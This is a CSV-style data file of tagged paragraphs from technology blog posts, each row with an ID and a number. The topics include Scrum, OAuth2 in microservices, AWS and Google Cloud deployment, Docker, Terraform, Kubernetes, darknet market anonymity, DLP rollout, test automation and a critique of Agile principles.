2008,"What does a Scrum Master do? The Scrum Master removes any impediments that obstruct a teams pursuit of its sprint goals. If developers dont have a good sense of what each other are doing, the Scrum Master helps them set up a physical task-board and shows the team how to use it. If developers arent colocated, the Scrum Master ensures that they have team room. If outsiders interrupt the team, the Scrum Master redirects them to the Product Owner. If the team has not learned how to develop a potentially shippable product increment every Sprint, the Scrum Master teaches them Test Driven Development (TDD), or finds people who can teach them. If the existing code is so bad that it slows down new development, the Scrum Master helps the team learn how to pay off technical debt incrementally.","['Agile', 'Product Management', 'Scrum', 'Scrum Master', 'Productivity']",1
2009,"Scrum Masters are full-time transformation agents, but they do not push for change. What do people do when you push them? Instead, effective Scrum Masters promote transformation through illumination and invitation. Conversations with executives dont work without a background of relatedness. In established organisations, improvements come in fits and starts. Sometimes it seems like nothing is changing, then the organisation has a breakthrough right when we were about to give up. This can be emotionally taxing, so I advise Scrum Masters to connect with a community of Agilists. Product development is mostly about knowledge creation and collaboration, but most large organisations would require fundamental changes before they could be called learning organisations.","['Agile', 'Product Management', 'Scrum', 'Scrum Master', 'Productivity']",1
2010,"And that is my experience as well. What has really baffled me though is the lack of knowledge and experience that even senior developers and architects have on the subject. Even books that I have read concerning microservice architecture have examples where OAuth2 is used in a way that, at best, can be described as creative writing. If you have read Microservice Patterns by Chris Richardson then this blog post is necessary for you just to clear up any misunderstandings you might have around the use of OAuth2 in microservice architecture. Take the following drawing which is based on Fig.","['Oauth', 'Security', 'Cloud', 'Microservices']",19
2011,"Firstly, there is nothing wrong, technically, with doing something like this. Its fully possible to do it. The question is, should you do it? The example that Chris Richardson is using involves using what is called a Password grant type. The concept is that the user gives his username and password to a client application that uses his/her credentials to obtain a so-called access token. The access token can be used by the client application to gain access to a server on behalf of the user. The first issue with this grant type is that it involves the client asking the user for his/her password which is only secure as long as the client application exists in the same security zone as the Authorization server and is what we call a confidential client. In technical terms, that means that you need the client application to be a backend client-server application that makes use of m TLS between the client application and the API Gateway. Without those security mechanisms this, OAuth2 pattern, isnt secure from an information security perspective. The second issue is that it is conceptually wrong. The Password grant type was never meant to be used like this. When the Password grant type is done correctly, the client will make a direct request to the Authorization server to obtain an access token, then make a second request, with the access token, to the API Gateway. The API Gateway will, as a proxy, forward the request with the access token to the microservice. Well, its to make sure that you authorize the client applications use of the resource server on behalf of the user. What is happening in the example above is that you authorize the API Gateway for using the microservice. That just doesnt make any sense. Read my post on The separation of concerns between API Gateway and microservice to understand why. From a security point of you, you might as well use Basic access authentication and use network security policies for service-to-service communication. Most Paas and Caas providers have very simple ways of configuring this.","['Oauth', 'Security', 'Cloud', 'Microservices']",11
2012,"Use Client credentials grant if you are doing service to service communication or if you are dealing with multiple organizations and reaching a consensus among them, in regards to agreeing on a common solution for providing identity and authorization, is far fetched considering the time and resources that are available to you. You can always migrate from a Client credentials grant to an Authorization code grant later on so my advice is to start setting up a Client credentials grant first. F.ex the resource server will be completely unaware that the client application has something called a user. The Client credentials grant only care about client applications and dont care what rights the user has given to the client application. This means that the resource server has to trust that the client application has been given proper consent for accessing the resources on the resource server. Still, since Authorization code grant alone wont solve all challenges related to information security by itself, that is just fine.","['Oauth', 'Security', 'Cloud', 'Microservices']",11
2013,"This template deploys a CW Log Destination backed by a Kinesis Stream with a Lambda Function plus Event Source Mapping. The lambda function (Kinesis-Event-Receiver) is written in python 3.6 and will decode the Kinesis stream Cloud Trail records and you can add your own integration code directly into this function. You will need to add or update the list of AWS account numbers that you will be receiving events from (via a template parameter). You deploy this stack in the receiving account.2. This template deploys a new Cloud Trail Trail, a Cloud Watch Log Group integrated with the Trail and a Subscription filter in the Log Destination (created in the previous stackmake sure the log destination names match and the log destination policy have this AWS account added to its policy.) You deploy this in each source AWS account.3. If everything has been deployed correctly, you should see log entries of decoded Cloud Trail records in the Kinesis-Event-Receiver Cloud Watch Logs Group within a couple of minutes.","['AWS', 'Cloudtrail', 'Security', 'Cloudwatch', 'Kinesis']",7
2014,"Like I just said, we have to choose an image to start with. Im going to start with Ubuntu. To make our base image Ubuntu, add this line: Whats latest? They are often versions, but latest will pull the latest published ubuntu image in Docker Hub. A public registry of images available for your use! Now we need to install a dependency, the jre (which is required on any machine to run a java application). Dockerfiles have a RUN command that we can utilize as if we were installing a jre on an ubuntu machine from the command line.","['Docker', 'AWS', 'Spring', 'Java', 'Kubernetes']",7
2015,Question remainswill you be brave enough to become part of this jungle and if so how long will you survive? Owner of __url__ Alsobig enthusiast of China.,"['Software Development', 'Testing', 'Funny', 'Documentary', 'Internet of Things']",17
2016,"Some of the documentation on Google regarding PHP deployments is lacking, so I substituted it in some places with the documentation from Python. If you plan on deploying a Laravel app with Google App Engine just by following the Google documentation I highly recommend having a look at both.1. PHP on Google Cloud Platform Well be using Flexible environment so read about that as well.3. Create a Google cloud account: here or more directly here.","['Google Cloud Platform', 'Google App Engine', 'Laravel', 'Deployment', 'App Development']",7
2017,"If you run Windows you need to open the installer with administrator rights. Follow the quickstart tutorial from google for the other OSs.5. Before you continue with Google Cloud Shell, I recommend reading this about the PHP environment.6. Login in the console using command gcloud auth login. You will be logged in through the browser. If you want to see all the available commands write gloud help in the command line and press enter.7. Write gcloud config set project project_id in the command line, where project_ id is the project id you just gave to your newly created project. It can be found on Google console on the first page after you select the project under Project info widget.8. To see a list of all your projects type gcloud projects list.","['Google Cloud Platform', 'Google App Engine', 'Laravel', 'Deployment', 'App Development']",7
2018,"For this tutorial I will be using as an exemple an application I am building right now. A simple blog having Backpack for Laravel as admin panel. While were here, I have to let you know that V __url__ is compatible with Google App Engine. You just need to run npm install and npm run prod and that will do the trick. In this tutorial we will not be using Vue.js.1. Change the directory to you application folder.","['Google Cloud Platform', 'Google App Engine', 'Laravel', 'Deployment', 'App Development']",7
2019,"In scripts, add script as below. In post-install-cmd script there is a recommendation to add php artisan cache:clear however from my experience with Google deploy this does not work. Thats why I recommend leaving it out. I only added the minimum Laravel packages in this __url__ example.7. Run gcloud app deploy in the google sdk command line (you have to be in the application folder) and when prompted answer Y.8. Run gcloud app browse to see your app.","['Google Cloud Platform', 'Google App Engine', 'Laravel', 'Deployment', 'App Development']",7
2020,"Here is the Google tutorial for setting cron jobs. I also took a look at the Python version. Knowing how to setup the cron jobs with Google App Engine when having a Laravel app is basic. Our app had a lot of schedules running and I had a hard time making them work or finding an answer anywhere on the web. Fortunately, we had the same issue with Amazon and already knew a fix. I tried it with Google App Engine and Hallelujah!1. Create a __url__ file and add this code:2. In your routes you need to add the scheduler route like this (outside of any middleware):3. You can see your crons or run them manually in App Engine Task queues.","['Google Cloud Platform', 'Google App Engine', 'Laravel', 'Deployment', 'App Development']",7
2021,"This seems to make some people spin their heads, so Im gonna try to make it as easy and visual as possible. I also added a quick video here.1. Go to your Google Cloud console.2. In the menu look for SQL and click it.3. Click create instance and choose My SQL.4. Choose second generation and choose an id and a password.5. Now copy the instance connection name and paste it in your __url__ in beta_setting cloud_sql_instances: instance_connection_name.7. Also complete the database connection data in app.yaml.","['Google Cloud Platform', 'Google App Engine', 'Laravel', 'Deployment', 'App Development']",7
2022,"The recommended way to view data, at least in my experience, is to use Workbench and the certificates Google provides. For this part I used this document as inspiration.1. Go to your Google Console Dashboard and click on you instance id.2. On the top of the screen (right above the charts) choose SSL.3. Scroll down and click on Create a client certificate and store them on your computer. I recommend one per computer, but its up to you.4. Open My SQL Workbench and in the connection tab complete the details from Overview tab => Connect to this instance a square (for the ip mostly). Use the same user and password as you app.yaml.","['Google Cloud Platform', 'Google App Engine', 'Laravel', 'Deployment', 'App Development']",7
2023,"To run the migrations and seeder you need to do kind of a hack, but if you found another way please let me know in the comments below, because Ive been looking for a more elegant method.1. Go and download the proxy file.2. In the Google Cloud Console change directory to the directory where you downloaded the file.3. In __url__ file put your database and password from Google and use localhost as host.6. In command line run any migration or seeder command as you would normally do.","['Google Cloud Platform', 'Google App Engine', 'Laravel', 'Deployment', 'App Development']",7
2024,Written By Dave Nicolette We humans like to simplify complicated things. Simple things are easier to understand than complicated ones. Simple problems are easier to solve than complicated ones. Simple goals are easier to achieve than complicated ones.,"['Agile', 'Agile Methodology', 'Business Agility', 'Scrum Master', 'Project Management']",4
2025,"Different business operations within the same enterprise may need to interact with their markets differently and build their products differently. Some areas may need to operate similarly to a Lean Startup (corresponding roughly with our Basecamp 5). Others may need to stabilize a more-traditional pace of delivery, stopping at Basecamp 2.","['Agile', 'Agile Methodology', 'Business Agility', 'Scrum Master', 'Project Management']",1
2026,"A company operating at the Basecamp 1 or 2 level probably cant achieve that pristine goal. Imagine a large company that makes network switches. Every release of their hardware and software must be backward compatible with all the equipment currently in use in the field. The company Im thinking of operates at 10 locations in 7 countries. Its common for their projects to involve 750 people, with multiple teams contributing from multiple locations. Do you think an external customer of network switches in, say, Brazil will interact directly with Engineer #7 on Team #345 in Hungary and with Programmer #13 on Team #764 in China? The insistence that developers interact directly with external customers takes the simplification of organizational structure beyond the point of diminishing returns, and it becomes silly.","['Agile', 'Agile Methodology', 'Business Agility', 'Scrum Master', 'Project Management']",1
2027,"Most Basecamp 1 organizations havent fully transitioned to cross-functional teams. They still have functional silos that arent aligned with products or value streams. The customer for the Programming team is the Testing team. The customer for the Testing team is the Integration Team. The customer for the Integration Team is the Deployment Team. The customer for the Deployment Team is the Production Support team. It wont remain that way forever, but for the moment its the reality. Each team performs best when they treat the downstream team as a customer in the true sense, even if from an enterprise point of view they are not actual customers. We have to be realistic and flexible in such matters. And of course, eventually all those activities will be handled by a cross-functional Development Team.","['Agile', 'Agile Methodology', 'Business Agility', 'Scrum Master', 'Project Management']",1
2028,"You might wonder if its even possible for internal development teams to work directly with external customers. Ive seen it, but only when a young company is in the starup phase. A company I know of makes Io T devices that monitor the health of industrial equipment in situ. During their startup phase, their engineering/programming team (20 people) collaborated directly with two early adopter customers to prepare the initial production release of their product. Now that theyve outgrown the startup phase, they have more than 20 engineers/programmers and more than 2 customers. The pristine Agile vision of developers working directly with external customers is no longer feasible.","['Agile', 'Agile Methodology', 'Business Agility', 'Scrum Master', 'Project Management']",12
2029,"In this section Ive harped on just one piece of Agile dogma; the requirement to work with external customers. Theres a laundry list of things Agilists would prefer we do, and the feasibility of each one depends heavily on the situation at hand. It isnt helpful to be dogmatic about what is or isnt Agile across all contexts. Its a process of continual improvement. As long as youre introspecting and improving, youre on the right track.","['Agile', 'Agile Methodology', 'Business Agility', 'Scrum Master', 'Project Management']",12
2030,"Terraform is considerably more flexible than this. It has a concept of data sources, which provide a read-only representation of some resource, allowing you to access its properties without affecting its state. Data sources open a wide range of options to integrate related stacks easily and avoid hard-coding the required parameters. For example, you can access properties of externally managed resources (e.g. find the latest AMI), ingest outputs from a Cloud Formation stack, reuse attributes exposed by other Terraform stacks (such as an endpoint for a database or a DNS record), and if thats not enough, run some custom scripts that provide the required values. There is only a single source of truth, and this truth is the current state of the infrastructure, not its snapshot from a while ago, as frequently happens with configuration files. All changes to a resource propagate to all other resources which depend on it during the next Terraform run, without the possibility of a duplicate value being forgotten somewhere, and at the same time maintaining a clear separation of concerns. Another benefit is that you can use the same CI/CD pipeline for managing all your Terraform projects without having to worry about passing the correct set of arguments to each and every resource.","['AWS', 'Terraform', 'Infrastructure As Code', 'Cloudformation', 'Immutable Infrastructure']",8
2031,"One of such cases is managing the S3 bucket used for storing Terraform state files. Creating it manually shouldnt even be considered to be an option, as in this case one of the most important buckets in your infrastructure would be essentially unmanageable and unauditable. You can, of course, provision it in Terraform, but it seems to immediately turn into a chicken-and-egg proble m where are you going to store the state file of the bucket used to store the state files? One option is to commit it to a source control system, which may work ok if you are not making frequent changes to this resource, but is generally not the best idea. Cloud Formation can be a compelling option to master this bucket, as then you dont have to worry about state file altogether. Alternatively, you could indeed create it in Terraform using local state at first, and then add the S3 backend pointing to the same bucket that was just created. After you reinitialise your project by running terraform init, Terraform would migrate the state file to S3.","['AWS', 'Terraform', 'Infrastructure As Code', 'Cloudformation', 'Immutable Infrastructure']",7
2032,"The Kubernetes master includes a component called the API server which provides an API that you can talk to using the kubectl. In addition it also includes a scheduler, which makes decisions on which container is supposed to run where (schedules the containers). The final component is the controller-manager, which is actually a set of multiple controllers responsible for handling node outages, handling replications, joining services and pods (sets of containers), and finally dealing with service accounts and API access tokens. All the data is being stored in etcd, which is a strongly consistent key-value store (with some really cool features). So to sum it up, the master is responsible for managing the cluster.","['Docker', 'Kubernetes', 'DevOps']",11
2033,"Next up, you need to monitor your Kubernetes installation. So right away you need something like Prometheus, Grafana, etc. Do you run it inside of your Kubernetes? If your Kubernetes has a problem, is your monitoring then down? Or do you run it separately? If yes, then where do you run it? What will you do if your masters crash, the data is unrecoverable and you need to reprovision all pods on the system? Did you test how long it takes to run all jobs in your CI system again? Do you have a disaster recovery plan? Now, since we are talking about the CI system, you need to run a Docker registry for your images. This, of course, you can again do in Kubernetes, but if Kubernetes crashes you know the drill. The CI system is, of course, also a concern, as is running your version control system. Ideally, isolated from your production environment so that if that system has an issue, at least you can access your git, re-deploy, etc.","['Docker', 'Kubernetes', 'DevOps']",7
2034,"Operators of Darknet markets stick to Tor hidden services, probably because they know that they would definitely be in jail quickly if they ran a drug marketplace on the normal internet where any government could just subpoena the server host. Every market uses cryptocurrencies because a government would quickly subpoena any centralized payment processor. Address encryption is optional though, probably for the same reason that file sharing users didnt really care about anonymity. The possibility of your house actually being raided because you ordered a personal amount of marijuana online probably seems remote to a lot of people, so why bother with all of this complicated stuff? Almost every popular darknet market has a corresponding forum on Tor which users can use to discuss topics about usage, best practices, trustworthy vendors, etc. Up until March of 2018 though, the goto place to discuss all of these topics was reddit. Subreddits like r/Darknet Markets had hundreds of thousands of subscribers plus posts and comments streaming in by the minute. After a change in US law though, Reddit shutdown all of the darknet market subreddits along with other communities to do with prostitution, theft, and legally selling guns.","['Blockchain', 'Decentralization', 'Privacy', 'Product Design']",17
2035,"Anonymity only really matters to users who are seriously at risk of being identified and realize that anonymity is crucial. Operators of hidden services get this and that is why Dread and almost all darknet markets are on Tor. A few use I2P, but for the most part the difference in anonymity isnt worth the drop in users. On darknet markets, a lot of vendors understand that using PGP is important because they spend a lot of time worried about being raided and sent to jail. End users dont understand this as much, so PGP usage varies for casual buyers. People using file sharing services to pirate music and movies probably arent actually concerned about being sued by the RIAA or MPAA, so providing anonymity will just seem slow and it might be better to just recommend a VPN.","['Blockchain', 'Decentralization', 'Privacy', 'Product Design']",17
2036,"The problem arises over time, as your application grows in size. Soon you will find that what once was a small application is now a monstrous monolith, with millions of lines of code. You will soon find that any attempts at agile development and delivery will fall flat. Your application has become too complex for any one person to fully understand. As a result bug fixes and feature implementation become difficult and time-consuming. This soon turns into a downward spiral. Since your application is hard to understand, changes are prone to bugs, bugs which may be lost in a sea of code.","['Microservices', 'System Architecture', 'Distributed Systems', 'Monolithic']",13
2037,"Monolith applications may also be difficult to scale. Many times different modules within your application will have conflicting resource requirements. For example, one module might benefit from an environment optimized for CPU intensive tasks such as image processing. This module would be ideally deployed in Amazon EC2 Compute Optimized instances. Another module might be an in-memory database and would be much better suited in Amazon EC2 Memory-optimized instances. If you have a monolith application, however, you will need to decide which of the two will be compromised for the optimization of the other.","['Microservices', 'System Architecture', 'Distributed Systems', 'Monolithic']",10
2038,"One attempt to solve these issues was with Service Oriented Architecture (SOA). SOA is a software architecture pattern, in which an applications components provide services to other components via a communication protocol over a network. There are 2 main roles in SOA, the service provider, and the service consumer. The provider and the consumer speak to each other over the Enterprise Service Bus(ESB). The ESB, however, becomes a bottleneck of sorts, creating a single point of failure for the application. If a single service is running slow, the entire ESB may become backed up with requests for that service.","['Microservices', 'System Architecture', 'Distributed Systems', 'Monolithic']",10
2039,"There are, however, drawbacks to microservices. A major drawback to microservices is the complexity introduced by a microservice application being a distributed system. Developers must design and implement a communication mechanism based on either messaging or remote procedure call (RPC). The developers must also account for partial failures since the destination for a request might be slow or unavailable. Testing in microservices can also become a drawback. Its complexity is increased due to the fact that to test a particular service you must either fire up other services it depends upon or stub them out.","['Microservices', 'System Architecture', 'Distributed Systems', 'Monolithic']",10
2040,"Its been roughly 7 years since I started my life as a software engineer, but it feels more like 20. For the first couple of years, I was living and working in Salt Lake City. Salt Lake is a city of families where stability and time spent at home are foundational shared values for most of the residents. But, when I left SLC in 2013, I was looking for something else. As a young man I was looking for a way to change the world, and I had been enculturated to believe in the entrepreneurial spirit of startuplandia. I wanted to be a part of a community drenched in innovation, and I thought the world was telling me to go west, young man.","['Education', 'Self Improvement', 'Technology', 'Computer Science', 'Genetics']",2
2041,"Despite my frustrations, I have learned a lot in my time as an industry programmer, and I have taken great joy and pride from my time as an educator. Teaching is something I always come back to; in high school I made a few bucks tutoring fellow students after class; throughout college I was a TA for computer science courses, as well as an assistant debate coach for my alma mater. Something about sharing knowledge and watching others learn, sets my heart on fire. Its thrilling to me when someone says, Id never thought about it that way or, OHH that makes sense! or one of my favorites, I have a question about that I dont want to give up my life as a teacher, and in graduate school Ill definitely have a chance to teach. But, I also want to do more than just teach a few undergraduate courses. The part of me that wants to change the world has been languishing under the valleys disruptive version of change, but it hasnt died. And thanks to some of the bright spots in the technology industry, there are more avenues than ever for someone like me to share my light with the world.","['Education', 'Self Improvement', 'Technology', 'Computer Science', 'Genetics']",2
2042,"These files have a specific syntax that Docker reads and executes when the build instruction is called The first instruction in a Dockerfile is FROM which specifies the base image. It is best to use an image from the official repository of Docker Hub. Among my favourites are:- Ubuntu- Tensorflow- Jupyter Notebook- Mongo DBThe Dockerfile informs docker to build a new image with this base image and any new instruction in the rest of the file will modify the base image. The FROM command is imperative as the Dockerfile is invalid without it. For instance to use the latest distribution of Ubuntu as base we use the following code: You can use any image in the repository as long as you specify their tag (here ubuntu:latest): To start a new image from scratch, the following command must be added to the Dockerfile: However I strongly advise to always build your images from existing (official) images. Now from there we can write additional instructions to build our new image. As an example, I build here a python STL workspace with the following softwares / libraries:- python 3.6- pip3- Jupyter notebook- numpy- scipy- pandas- matplotlib Inside the Dockerfile, we can run shell scripts using the RUN command. The default shell is /bin/bash for both Mac OS and Linux machines: After loading the new image, the software and libraries will be installed on the system at runtime.","['Docker', 'Python3', 'TensorFlow']",7
2043,"Since the Docker container we will eventually run is virtually isolated form the host OS, there will be a need to have a connection between both. To do so we need to specify a port of the container that host OS will listen to. The first step is to expose this port using the EXPOSE command: Another useful command that I often add to my Dockerfiles is the CMD command that runs a script when the container starts. This allows for example to launch Jupyter notebook once my container is live. You can either write the command inline or refer to __url__ file (or something equivalent). Adding this shell file to the container with an ADD is handy.","['Docker', 'Python3', 'TensorFlow']",7
2044,"There needs to be an entity in any security organization that drives direction. This direction will be determined by the organizations business requirements (e.g. Protection of source code), regulatory requirements (e.g. If the organization is on the small size, it can be one or two people.","['Security', 'Cybersecurity', 'Information Security', 'Privacy', 'Technology']",16
2045,"Regardless of the makeup, the group is tasked with developing and communicating the requirements. These requirements should be specify the details of the DLP policy and to whom in the organization it should apply. There should also be additional communication about the risks of implementing the DLP policy. This will give technical teams additional insight and possibly prevent errors and business disruption down the road. This guidance should be presented in a clear and professional manner. A short hand-off meeting may also be a good idea ensure requirements, risks and timelines are understood and agreed upon.","['Security', 'Cybersecurity', 'Information Security', 'Privacy', 'Technology']",1
2046,"Mature organizations usually have a test environment set up for key systems. A test environment for desktops and laptops are often overlooked. The assumption may be that if a change or a patch has a negative effect on a PC, that device can be easily replaced. In practice, the risks are more complicated. Todays business user may have a diverse set applications installed on their device. Most will be those sanctioned and approved by the technology group. Others will be open source or shadow IT apps. Whatever the makeup, any one of these tools can be affected any upgrade, patch update or DLP policy addition or modification. Without a test environment, your organization is at larger risk of a business disruption.","['Security', 'Cybersecurity', 'Information Security', 'Privacy', 'Technology']",16
2047,"The goals of the policy creation and testing phase are clear: create the policy in the software that align to the requirements specifications while considering the risks and consequences of deployment to in scope endpoints. As with many processes, the goal is straightforward, while the implementation is hard work. Once the initial policy is created, the architecture team has to test it to ensure the desired effect is generated. For example, if the blocking of a combination of a social security number plus an American name is expected, one might try saving a text or MS Office with these attributes to a USB stick. What are the results with slightly different files, communication channels and data? Also, while making several attempts with slightly different files, what is the ratio of false positives to false negatives? The testing stage is the only on in which you have the opportunity to experience false negatives.","['Security', 'Cybersecurity', 'Information Security', 'Privacy', 'Technology']",13
2048,"Once a DLP policy is created with a desired effect that is within a tolerance that management is comfortable with, it may be tempting to deploy it out to the enterprise and move on to the next challenge. You have more testing to do. Especially in larger organizations, its close to impossible to predict how a policy is going to affect key systems and business processes. Organization have a wide assortment of business applications, both commercial off the shelf (COTS) and home grown. To mitigate the risk of the policies negatively affecting these business applications, they should be deployed in a preproduction environment. Typically, these endpoints will include a sampling of users, whose PCs should contain a good cross section of the enterprises applications. If the endpoints, systems and processes are adequately documented, Security Architecture will be better suited to respond to issues and adjust the policies accordingly and, if needed, engage the vendor for assistance.","['Security', 'Cybersecurity', 'Information Security', 'Privacy', 'Technology']",1
2049,Youve shown the policies will have the desired effect. Youve tested it on a variety of endpoints containing a diverse collection of enterprise apps.,"['Security', 'Cybersecurity', 'Information Security', 'Privacy', 'Technology']",18
2050,"One of the banes of automated testing is often this refrain: I cant start until the developers have completed their work. You can start writing your test code as soon as you receive the user stories. Scaffolding is meant to write the broad brushstrokes of the test code. The goal of code scaffolding isnt to be complete nor to be fully functional. The objective is to get the feature described in the user story into your testing code quickly and early. Once the developer has completed their work, you should only have to connect identifiers from your code to the identifiers in the software elements for it to work.","['Software Testing', 'QA', 'Automation', 'Testing My Story', 'Quality Engineering']",13
2051,"Three things need to have happened to make it to this point: You have written out all your manual test cases You have completed the test code scaffolding The developers code has made it through code review and has merged it into a develop/testing branch Once these are done, you can connect the code scaffolding that youve created and write out a basic automated test. Lets get into that: In Task 2 we created the code scaffolding. Now its time to connect it to the code from development. You will use the identifiers for the features elements (via CSS, xpath, IDs, etc.) in the code scaffolding, connecting the two. Once this is done, youll A basic test should be something simple that will touch as many elements of the feature as possible. Something such as All the expected elements for the feature are on the page and have the correct text. The point of the basic test is to ensure the properties of the feature are accounted for in your scaffolding. Performing other tests should (theoretically) be possible without much hassle if you get those connected and validated.","['Software Testing', 'QA', 'Automation', 'Testing My Story', 'Quality Engineering']",15
2052,"Once all four tasks have been completed for that feature/user story, you can say that all work on it has been done. Of course, this is an ideal. Depending on your projects cadence, expectations, available resources, etc., you may not be able to complete all the tasks. For instance, on a recent project of mine, we agreed that only Tasks 1 and 2 would be required for each sprint. We would complete as many Task 3s as time allowed. It was understood that Task 4s would likely live in the backlog. This still allowed us to complete all manual testing, capture 100% of the functionality delivered by development in our test code, and write approximately 35% of our test cases into automation.","['Software Testing', 'QA', 'Automation', 'Testing My Story', 'Quality Engineering']",1
2053,"As projects go forward you will start to see user stories that update current functionality rather than create new (i.e.maintenance). When you come across this, it will be up to you as to how you should proceed. Is it a simple text update or a full refactor? Will the updates needed be easy or complex? For this phase, I generally will rebrand the tasks above like this: Task 1: Update Manual Test Casesassuming the updates arent a complete tear-down, you should be able to update the current test cases. You may need to write some new ones, too.","['Software Testing', 'QA', 'Automation', 'Testing My Story', 'Quality Engineering']",18
2054,"The PO is part of the Scrum Team. Ask them questions when things arent clear, or even when they are (assumptions are silent killers). Check that you are on the right path. Negotiate scope when it feels like things are off-track. Ask if there is a simpler way to meet the goal.","['Agile', 'Scrum', 'Scrum Master', 'Scrum Agile']",0
2055,"In order to inspect how much memory is being allocated and the source of those allocations well use pprof. pprof is an absolutely amazing tool and one of the main reasons that I personally use go. In order to use it well have to first enable it, and then take some snapshots. If youre already using http, enabling it is literally as easy as: Once pprof is enabled well periodically take heap snapshots throughout the life of process memory growth. Taking a heap snapshot is just as trivial: The goal is to get an idea of how memory is growing throughout the life of the program. Lets inspect the most recent heap snapshot: This is absolutely amazing. pprof defaults to Type: inuse_space which displays all the objects that are currently in memory at the time of the snapshot. We can see here that bytes.","['Software Development', 'DevOps', 'Go', 'Software', 'Software Engineering']",3
2056,"Git Flow Main advantage of the Git flow is the strict control. Pull Request can be used to limit and control access to branches. Same advantage is also could become a disadvantage as it slows down the continuous integration of code that eventually result in slower feedback cycle. Youll have to compromise one with another depending the on the nature of the project and the team. If the team consists of many junior developers, itd be good to review code before merging to master at least until confidence about the code quality is satisfactory. However, if the team is well experienced and had worked together previously, you dont need to slow them down with unnecessary gates, rather checking the issue if it arrives.","['Git', 'DevOps', 'Branching Model', 'Trunk Based Development', 'Gitflow']",18
2057,"Trunk Based Development (TBD)Trunk Based development is super simple. All developers commit to the same branch. Then deliver all the way to production using pipelines of deployment stages. Dev Ops tools facilitate required visibility of builds and artifacts. Main advantage of this approach is the quick integration and feedback cycle-time. If something goes wrong due to your commit, youll immediately known via CI Build failure. Also, itll completely avoids the merging horror.","['Git', 'DevOps', 'Branching Model', 'Trunk Based Development', 'Gitflow']",18
2058,"The last post generated a lot of feedback. This led to some interesting exchanges online that raise an important question: What exactly is Agile? I was told, more than once this past week, that Agile is just a set of principles, and anything that aligns with the principles is Agile.","['Agile', 'Scrum', 'DevOps', 'UX', 'Product']",12
2059,"So, stated another way: Anything not at odds with the Agile principles can be claimed as being Agile? That doesnt seem all that helpful. Take some new set of practices. If the Agile principles did not meaningfully uncover, point to, or prescribe these new practices, but merely aligns with them, how does that matter? (Is it like a candidate being endorsed by a politician? It smacks of marketing, or a turf war.) Why do we then keep referring back to Agile, giving it preference over so many other ideas? As digital orgsof necessitycontinue to evolve past a 19th-century factory mindset, dubbing it all Agile in retrospect is misleading. Truth be told, Agile may not have even helped with this evolution much. Agile in practice largely lost to Scrum, which kept the focus on local cost and optimization, enforcing an incrementalist, feature factory mindset. (As argued last time, I do think many in the product community are moving past this obsession. Younger product teams dont seem to self-identify as doing Agile. It seems like its mostly older people trying to claim that everything is Agile. Maybe its no coincidence so many exchanges with Agilists end up reminding me of Horace Nebbercracker in the movie Monster House. )That some (rather vehemently) insist that Agile is the box everything must fit in is just weird. Isnt Agile just one of many things? I have been told this week that Lean itself is Agile thinking (even though it predates the Manifesto by half a century), and that Dev Ops is just Agile too.","['Agile', 'Scrum', 'DevOps', 'UX', 'Product']",12
2060,"Fine, I say, if everything must be tied back to the Agile principles, then these had better be some pretty damn good principles. I mean, after a while, Agilists start sounding like the followers of Sydney Banks Its all about THE PRINCIPLES. So, these principles must be really important, pretty all-encompassing. If we dont take them seriously today, we invite failure, right? Doesnt this at least assume the principles all hold up today? It would seem to, else why all the hullabaloo? But do they really hold up today? It may have been a while since youve read through them.","['Agile', 'Scrum', 'DevOps', 'UX', 'Product']",12
2061,"Ive seen people claim its basically everyone impacted by your work. As Melissa Perri has noted, the Manifesto coauthors were talking about business stakeholders, which is likely why the Manifesto is still focusing on requirements. As Mark Schwartz points out, the hidden assumption is that the business knows what will be of value (quite a BS assumption). One more question: How do you typically satisfy business stakeholders? Answer: By asking them what they wantand thats why most features are seldom or never used and 6090% of what we build is waste.2. Welcome changing requirements, even late in development. Agile processes harness change for the customers competitive advantage.","['Agile', 'Scrum', 'DevOps', 'UX', 'Product']",12
2062,"Requirements are not a good way to communicate, period. This spotlights that Agile is still focused on output, not outcomes. An outcome is the concrete behavior change youre trying to achieve to create business value. Its the users behavior youre typically expecting to change, not the business stakeholders. (Who then should you be spending most of your time learning about?) Focusing on outcomes makes you realize that your output is just a tool for testing your assumptions. As Jeff Patton puts it, you shouldnt be trying to maximize output at allyou should be trying to maximize outcomes per minimal output. Deliver working software frequently, from a couple of weeks to a couple of months, with a preference to the shorter timescale.","['Agile', 'Scrum', 'DevOps', 'UX', 'Product']",1
2063,"Sure, shrink your damn batch sizes already. But realize what youre really doing is vetting assumptions about what output will achieve outcomes, and what outcomes will deliver business impact. Whether youre having the right kinds of conversations with users, having them show you their current workflow, sketching an idea, doing some quick participatory prototyping, or just always coding software, all of it is just levels of continuous vetting. And why the focus on software? Its ironic when Agile teams say they dont need to learn about discovery work because theyre already inspecting and adapting. As Alan Cooper points out, most Agile teams keep most of their code, which means they arent really inspecting and adapting anything. Theyre just chunking their work into time boxes, and thats not the same thing.4. Business people and developers must work together daily throughout the project.","['Agile', 'Scrum', 'DevOps', 'UX', 'Product']",1
2064,"Business people must be kept in the loop. Developers and end-users must work together daily. Ive seen people point to XP and say, Thats what Agile meant. Maybe, but thats not what the principles say! XP had a lot of real goodness to it (ignoring that many people actually hate pair programming). It in fact introduced many concepts that are now a part of the Dev Ops movement. With that said, stressing pragmatism and progress over idealism, it might be time to admit that Agile lost to Scrum. As Patton argues, Scrum has a middleman, the PO, stand in as the customer, enshrining the client-vendor antipattern and typically further removing developers from their actual users.5. Give them the environment and support they need, and trust them to get the job done.","['Agile', 'Scrum', 'DevOps', 'UX', 'Product']",12
2065,"Ive seen data (from Larry Maccherone) showing that distributed teams (in the same geo) get more work done than collocated teams. That certainly gels with my experience. Further, when team members are collocated with each other but not with the actual users, thats a bigger issue. Notice too that daily F2F collaboration also requires that everyone come into the office every day. This raises the question of more recent research showing that people who work from home have both greater job satisfaction and get more actual work done. As Jason Fried asks, what do you do when you really need to get something done? Most people do not go into the office, where it can be hard to concentrate and youre apt to get constantly interrupted.7. Working software is the primary measure of progress.","['Agile', 'Scrum', 'DevOps', 'UX', 'Product']",0
2066,"If thats what you think then, borrowing John Cutlers term, youre a feature factory. Achieving outcomes is the primary measure of progress. If you build something and your target outcome measure doesnt move in the right direction, you are not done. Who cares that you delivered working software? Notice too this principle assumes youre always achieving outcomes by building software. Sometimes you need to redesign the underlying workflow. Sometimes you need to change a policy. Sometimes you need to convince stakeholders that some of their assumptions are false.8. The sponsors, developers, and users should be able to maintain a constant pace indefinitely.","['Agile', 'Scrum', 'DevOps', 'UX', 'Product']",12
